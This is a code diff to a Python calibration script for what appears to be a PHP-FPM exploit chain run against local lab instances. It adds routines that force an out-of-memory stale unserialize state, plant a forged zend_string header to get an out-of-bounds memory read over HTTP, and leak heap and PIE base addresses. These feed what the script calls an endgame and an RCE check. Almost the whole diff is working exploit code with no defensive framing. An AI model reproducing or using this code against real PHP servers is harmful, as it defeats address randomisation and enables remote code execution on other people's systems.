@@ -72,6 +72,22 @@ def worker_running(version: str) -> bool:
     return fpm.find_pool_worker(version, "chain") is not None
 
 
+def fresh_oracle(version: str, attempts: int = 40) -> fpm.Oracle:
+    """An oracle bound to the current chain worker.
+
+    The worker is killed by the endgame (the fake destructor aborts it) and
+    FPM respawns it, so every phase asks for a fresh one.
+    """
+    last = None
+    for _ in range(attempts):
+        try:
+            return fpm.Oracle(version, "chain")
+        except RuntimeError as exc:
+            last = exc
+            time.sleep(0.25)
+    raise RuntimeError(f"no php-fpm worker for {version}: {last}")
+
+
 def start_lab(version: str) -> None:
     if worker_running(version):
         return
@@ -96,6 +112,7 @@ def find_reclaim(base: str, builder: str, version: str, oracle: fpm.Oracle,
         if size < need + 0x1000:
             continue
         try:
+            oracle = fresh_oracle(version)
             d = fpm._arm_stale(fpm.Target(base), fpm.Target(builder), oracle, 4 << 20)
             k = fpm._probe_cover(chain404, oracle, d, need, size, pads)
         except (RuntimeError, OSError) as exc:
@@ -117,6 +134,7 @@ def collect_slots(base: str, builder: str, version: str, oracle: fpm.Oracle,
     slots: list[tuple[int, int]] = []
     for _ in range(rounds):
         try:
+            oracle = fresh_oracle(version)
             d = fpm._arm_stale(fpm.Target(base), fpm.Target(builder), oracle, 4 << 20)
             k = fpm._probe_cover(chain404, oracle, d, 0x900, size, pads)
             if k is None:
@@ -197,6 +215,25 @@ def brute_force_candidates(base: str, builder: str, version: str,
 # HTTP leak geometry
 # --------------------------------------------------------------------------- #
 
+def arm_leak_state(chain: fpm.Target, builder: fpm.Target, oracle: fpm.Oracle,
+                   version: str, arm_path: str) -> int:
+    """Arm the stale state the way the leak does.
+
+    The leak arm page stores k0..k3 before the 4 MB tail, so the producer
+    OOM leaves those four zvals in the stale var_hash; the R:2 reference of
+    the consumer session then resolves to the freed k1 string.
+    """
+    session = fpm.session_file(version, fpm.OOM_SID)
+    with contextlib.suppress(OSError):
+        os.remove(session)
+    builder.get(arm_path, cookie=fpm._cookie(fpm.OOM_SID))
+    fpm.producer_get(chain, fpm.OOM_SID)
+    d = oracle.unserialize_data()
+    if not d or oracle.unserialize_level() != 1:
+        raise RuntimeError("leak arm did not leave a stale state")
+    return d
+
+
 def stale_strings(oracle: fpm.Oracle, d: int, layout: dict):
     """Addresses of the stale k0/k1 strings (data[0] and data[1])."""
     uns = layout["unserialize_data"]
@@ -238,62 +275,31 @@ def find_leak_buffer(oracle: fpm.Oracle, chain404: fpm.Target, pads: list[int],
     return found
 
 
-def calibrate_leak(base: str, builder: str, version: str, oracle: fpm.Oracle,
-                   layout: dict) -> dict | None:
-    """Discover the HTTP leak geometry for a build."""
-    chain = fpm.Target(base)
-    app = fpm.Target(base + fpm.PATHS["app"])
-    builder_t = fpm.Target(builder)
-    chain404 = fpm.Target(base + fpm.PATHS["probe"])
-    geom = fpm._leak_geometry(version) or {}
+def find_fake_header(oracle: fpm.Oracle, chunk: int, marker: bytes,
+                     read_len: int) -> list[int]:
+    """Addresses in the chunk where the forged zend_string header landed.
 
-    for pads, size in LEAK_SHAPES:
-        try:
-            d = fpm._arm_stale(chain, builder_t, oracle, 4 << 20)
-        except (RuntimeError, OSError) as exc:
-            log(f"    leak shape pads={pads}: {exc}")
-            continue
-        k0, k1 = stale_strings(oracle, d, layout)
-        if len(k0) < 2:
-            log(f"    leak shape pads={pads}: stale strings not found")
-            continue
-        marker = b"LBK" + os.urandom(5)
-        bases = find_leak_buffer(oracle, chain404, pads, size, marker)
-        chunk = oracle.chunk_base(d)
-        pie = oracle.pie_base
-        log(f"    leak shape pads={pads} size={size}: k0=0x{k0[0]:x} "
-            f"k1=0x{k0[1]:x} buffer copies={[hex(b) for b in bases]}")
-        for base_addr in bases:
-            header_off = k0[1] - base_addr
-            if header_off < 0 or header_off > size - 0x200:
-                continue
-            geom_try = {
-                "arm_path": geom.get("arm_path", "/bigvar.php"),
-                "pads": pads,
-                "size": size,
-                "header_content_off": hex(header_off),
-                "read_len": hex(0x30000),
-                "chunk_ptr_off": "0x0",
-                "chunk_base_off": "0x0",
-                "pie_ptr_off": "0x0",
-                "pie_base_off": "0x0",
-            }
-            found = probe_leak(base, builder, version, geom_try, oracle,
-                               chunk, pie, k0[0])
-            if found:
-                geom_try.update(found)
-                geom_try["read_len"] = hex(int(found["read_len"], 16))
-                log(f"[+] leak geometry: header=0x{header_off:x} "
-                    f"read_len={found['read_len']} "
-                    f"chunk_ptr={found['chunk_ptr_off']} "
-                    f"pie_ptr={found['pie_ptr_off']}")
-                return geom_try
-    return None
+    The header is recognised by the unique marker stored in its ``h`` field.
+    Several copies can exist (the request body carries the same bytes), so
+    every hit is reported and the caller picks the one that is followed by
+    the filler.
+    """
+    try:
+        mem = oracle.read(chunk, fpm.MEM_CHUNK)
+    except OSError:
+        return []
+    hits = []
+    index = mem.find(marker)
+    while index >= 0:
+        hits.append(chunk + index - 8)   # the marker sits at header + 8
+        index = mem.find(marker, index + 1)
+    return hits
 
 
-def probe_leak(base: str, builder: str, version: str, geom: dict,
-               oracle: fpm.Oracle, chunk: int, pie: int, k0_addr: int) -> dict | None:
-    """Run the leak with a candidate geometry and locate the base pointers."""
+def run_leak(base: str, builder: str, version: str, geom: dict,
+             oracle: fpm.Oracle, chunk: int, pie: int, k0_addr: int,
+             marker: bytes) -> bytes | None:
+    """Run one leak attempt and return the leaked bytes."""
     chain = fpm.Target(base)
     app = fpm.Target(base + fpm.PATHS["app"])
     builder_t = fpm.Target(builder)
@@ -303,57 +309,156 @@ def probe_leak(base: str, builder: str, version: str, geom: dict,
     content = bytearray(size)
     struct.pack_into("<I", content, header, 0x40000000)
     struct.pack_into("<I", content, header + 4, 6)
-    struct.pack_into("<Q", content, header + 8, 0)
+    struct.pack_into("<Q", content, header + 8, struct.unpack("<Q", marker)[0])
     struct.pack_into("<Q", content, header + 0x10, read_len)
     fill = min(read_len, size - header - 0x18)
     if fill > 0:
-        content[header + 0x18:header + 0x18 + fill] = b"Q" * fill
+        content[header + 0x18:header + 0x18 + fill] = b"\xa5" * fill
     parts = [{"name": f"pad{i}", "data": b"C" * pad}
              for i, pad in enumerate(geom["pads"])]
     parts.append({"name": "big", "data": bytes(content)})
     parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
     parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
 
-    for _attempt in range(3):
-        with contextlib.suppress(OSError):
-            fpm.ref_session_post(builder_t, fpm.REF_SID)
-            app.get(fpm.PATHS["app"], cookie=fpm._cookie(fpm.REF_SID))
-        try:
-            builder_t.get(geom["arm_path"], cookie=fpm._cookie(fpm.OOM_SID))
-            chain.get(fpm.PATHS["app"], cookie=fpm._cookie(fpm.OOM_SID))
-            fpm.ref_session_post(builder_t, fpm.REF_SID)
-            _status, _headers, body = app.post_multipart(
-                parts, b"CALLEAK", cookie=fpm._cookie(fpm.REF_SID), timeout=180.0)
-        except (OSError, RuntimeError):
-            continue
-        raw = fpm._dechunk(body)
-        index = raw.find(b"r\t")
-        if index < 0:
-            continue
-        read = raw[index + 2:index + 2 + read_len]
-        if len(read) < 0x1000:
-            continue
-        chunk_ptr_off = None
-        pie_ptr_off = None
-        chunk_base_off = None
-        pie_base_off = None
-        for off in range(0, len(read) - 8, 8):
-            value = struct.unpack_from("<Q", read, off)[0]
-            if chunk_ptr_off is None and value == k0_addr:
-                chunk_ptr_off = off
-                chunk_base_off = k0_addr - chunk
-            if pie_ptr_off is None and pie <= value < pie + 0x1000000:
-                pie_ptr_off = off
-                pie_base_off = value - pie
-        if chunk_ptr_off is None or pie_ptr_off is None:
-            continue
-        return {
-            "chunk_ptr_off": hex(chunk_ptr_off),
-            "chunk_base_off": hex(chunk_base_off),
-            "pie_ptr_off": hex(pie_ptr_off),
-            "pie_base_off": hex(pie_base_off),
-            "read_len": hex(read_len),
-        }
+    with contextlib.suppress(OSError):
+        fpm.ref_session_post(builder_t, fpm.REF_SID)
+        app.get(fpm.PATHS["app"], cookie=fpm._cookie(fpm.REF_SID))
+    try:
+        builder_t.get(geom["arm_path"], cookie=fpm._cookie(fpm.OOM_SID))
+        chain.get(fpm.PATHS["app"], cookie=fpm._cookie(fpm.OOM_SID))
+        fpm.ref_session_post(builder_t, fpm.REF_SID)
+        _status, _headers, body = app.post_multipart(
+            parts, b"CALLEAK", cookie=fpm._cookie(fpm.REF_SID), timeout=180.0)
+    except (OSError, RuntimeError):
+        return None
+    raw = fpm._dechunk(body)
+    index = raw.find(b"r\t")
+    if index < 0:
+        return None
+    read = raw[index + 2:index + 2 + read_len]
+    return read if len(read) >= 0x1000 else None
+
+
+def calibrate_leak(base: str, builder: str, version: str, oracle: fpm.Oracle,
+                   layout: dict) -> dict | None:
+    """Discover the HTTP leak geometry of a build.
+
+    The forged zend_string header has to land exactly on the stale k1
+    string; the oracle reports where it actually landed, so the content
+    offset is corrected until the stale string is overwritten.  The leaked
+    bytes are then scanned for the two base pointers.
+    """
+    chain = fpm.Target(base)
+    builder_t = fpm.Target(builder)
+    template = fpm._leak_geometry(version) or {}
+    probe_read_len = 0x30000
+
+    for pads, size in LEAK_SHAPES:
+        header_off = int(template.get("header_content_off", 0x17e8))
+        for _round in range(6):
+            try:
+                oracle = fresh_oracle(version)
+                d = arm_leak_state(chain, builder_t, oracle, version,
+                                   template.get("arm_path", "/bigvar.php"))
+            except (RuntimeError, OSError) as exc:
+                log(f"    leak shape pads={pads}: {exc}")
+                break
+            strings = stale_strings(oracle, d, layout)
+            if len(strings) < 2:
+                log(f"    leak shape pads={pads}: stale strings not found")
+                break
+            k0_addr, k1_addr = strings
+            chunk = oracle.chunk_base(d)
+            pie = oracle.pie_base
+            marker = struct.pack("<Q", int.from_bytes(os.urandom(8), "little"))
+            geom = {
+                "arm_path": template.get("arm_path", "/bigvar.php"),
+                "pads": pads,
+                "size": size,
+                "header_content_off": hex(header_off),
+                "read_len": hex(probe_read_len),
+            }
+            read = run_leak(base, builder, version, geom, oracle, chunk, pie,
+                            k0_addr, marker)
+            oracle.refresh()
+            hits = find_fake_header(oracle, chunk, marker, probe_read_len)
+            if not hits:
+                log(f"    pads={pads} header=0x{header_off:x}: fake header not "
+                    f"found in the chunk")
+                break
+            landed = None
+            for candidate in hits:
+                if candidate == k1_addr:
+                    landed = candidate
+                    break
+            if landed is None:
+                # the copy that carries the filler right after the header is
+                # the reclaim buffer itself
+                for candidate in hits:
+                    try:
+                        following = oracle.read(candidate + 24, 16)
+                    except OSError:
+                        continue
+                    if following == b"\xa5" * 16:
+                        landed = candidate
+                        break
+            if landed is None:
+                landed = hits[0]
+            delta = k1_addr - landed
+            if delta:
+                header_off += delta
+                log(f"    pads={pads}: header landed at 0x{landed:x} "
+                    f"(k1=0x{k1_addr:x}); shifting to 0x{header_off:x}")
+                continue
+            if read is None:
+                log(f"    pads={pads} header=0x{header_off:x}: leak read failed")
+                break
+            # the header now covers the stale string: locate the pointers
+            chunk_ptr_off = None
+            chunk_base_off = None
+            pie_candidates = []
+            for off in range(0, len(read) - 8, 8):
+                value = struct.unpack_from("<Q", read, off)[0]
+                if chunk_ptr_off is None and value == k0_addr:
+                    chunk_ptr_off = off
+                    chunk_base_off = k0_addr - chunk
+                if pie <= value < pie + 0x1000000:
+                    pie_candidates.append((off, value - pie))
+            if chunk_ptr_off is None or not pie_candidates:
+                log(f"    pads={pads}: pointers not found in the leaked bytes")
+                break
+            # a base pointer has to survive a second run: re-read the leak
+            # and keep the offsets whose target did not move
+            second = run_leak(base, builder, version, geom, oracle, chunk, pie,
+                              k0_addr, marker)
+            stable = []
+            if second is not None:
+                for off, target in pie_candidates:
+                    if off + 8 > len(second):
+                        continue
+                    value = struct.unpack_from("<Q", second, off)[0]
+                    if value - pie == target:
+                        stable.append((off, target))
+            if not stable:
+                log(f"    pads={pads}: no stable PIE pointer found")
+                break
+            pie_ptr_off, pie_base_off = stable[0]
+            read_len = pie_ptr_off + 0x28
+            log(f"[+] leak geometry: header=0x{header_off:x} "
+                f"chunk_ptr=0x{chunk_ptr_off:x} pie_ptr=0x{pie_ptr_off:x} "
+                f"read_len=0x{read_len:x}")
+            return {
+                "arm_path": geom["arm_path"],
+                "pads": pads,
+                "size": size,
+                "header_content_off": hex(header_off),
+                "read_len": hex(read_len),
+                "chunk_ptr_off": hex(chunk_ptr_off),
+                "chunk_base_off": hex(chunk_base_off),
+                "pie_ptr_off": hex(pie_ptr_off),
+                "pie_base_off": hex(pie_base_off),
+                "bases": "leaked over HTTP from a stale short-session string OOB read",
+            }
     return None
 
 
@@ -423,8 +528,16 @@ def calibrate(version: str, base: str, builder: str, update: bool,
             {"d_off": hex(off), "k": hex(content)} for off, content in no_oracle_slots]
 
     log("[*] primitive check ...")
+    try:
+        fresh_oracle(version)
+    except RuntimeError as exc:
+        log(f"[!] {exc}")
     primitive_ok = verify_primitive(base, builder, version, pads, size)
     log("[*] endgame check ...")
+    try:
+        fresh_oracle(version)
+    except RuntimeError as exc:
+        log(f"[!] {exc}")
     rce_ok = verify_endgame(base, builder, version, pads, size)
 
     # The no-oracle path uses a different buffer size, so its (d_off, k)
@@ -477,7 +590,9 @@ def calibrate(version: str, base: str, builder: str, update: bool,
 
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
-    parser.add_argument("--version", required=True)
+    parser.add_argument("--version", default=None)
+    parser.add_argument("--all", action="store_true",
+                        help="calibrate every built version")
     parser.add_argument("--base", default=None)
     parser.add_argument("--builder", default=None)
     parser.add_argument("--update", action="store_true",
@@ -487,6 +602,29 @@ def main() -> int:
     parser.add_argument("--keep-lab", action="store_true",
                         help="leave the laboratory running")
     args = parser.parse_args()
+
+    if args.all:
+        versions = profile_gen.built_versions()
+        failures = []
+        for version in versions:
+            base, builder = lab_urls(version)
+            try:
+                result = calibrate(version, base, builder, args.update,
+                                   args.leak, args.keep_lab)
+            except (RuntimeError, OSError) as exc:
+                log(f"[!] {version}: {exc}")
+                result = 1
+            if result:
+                failures.append(version)
+        log("")
+        log(f"=== {len(versions) - len(failures)}/{len(versions)} versions "
+            f"calibrated ===")
+        if failures:
+            log(f"[!] failed: {', '.join(failures)}")
+        return 1 if failures else 0
+
+    if not args.version:
+        parser.error("--version is required (or use --all)")
 
     base, builder = lab_urls(args.version)
     if args.base:
